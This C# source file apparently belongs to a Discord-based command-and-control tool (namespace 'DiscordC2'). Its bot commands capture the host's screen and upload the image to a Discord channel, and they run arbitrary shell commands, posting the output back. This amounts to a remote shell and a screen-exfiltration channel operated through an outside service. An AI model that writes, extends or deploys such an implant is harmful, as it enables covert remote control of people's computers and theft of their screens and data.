using Discord.Commands;
using RunMode = Discord.Commands.RunMode;

namespace DiscordC2.Modules;

public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
{
    public CommandService CommandService { get; set; }

    // [Command("hello", RunMode = RunMode.Async)]
    // public async Task Hello()
    // {
    //     await Context.Message.ReplyAsync($"Hello {Context.User.Username}. Nice to meet you!");
    // }

    // [Command("systeminfo", RunMode = RunMode.Async)]
    // public async Task SystemInfo(string command)
    // {
    //     string systemInfo = Utils.GetSystemInfo();

    //     IEnumerable<string> chunks = Utils.CommandOutputWrapper(systemInfo);
    //     foreach (string chunk in chunks)
    //     {
    //         await Context.Message.ReplyAsync(chunk);
    //     }
    // }


    [Command("screenshot", RunMode = RunMode.Async)]
    public async Task Screenshot()
    {
        await Context.Message.Channel.SendFileAsync(Utils.GetScreenshot(), "screenshot.png");
    }

    [Command("execute", RunMode = RunMode.Async)]
    public async Task Execute(string command)
    {
        string output = Utils.ExecuteCommandline(command);

        if (output == null)
        {
            await Context.Channel.SendMessageAsync("error");
            return;
        }

        if (output.Length > 2000-8) {
            IEnumerable<string> chunks = Utils.CommandOutputWrapper(output);
            foreach (string chunk in chunks)
            {
                await Context.Channel.SendMessageAsync(chunk);
            }
            await Context.Channel.SendMessageAsync("error");
        } else {
            await Context.Channel.SendMessageAsync($"```\n{output}\n```");
        }
        // Console.WriteLine($"{command}");
        
    }
}

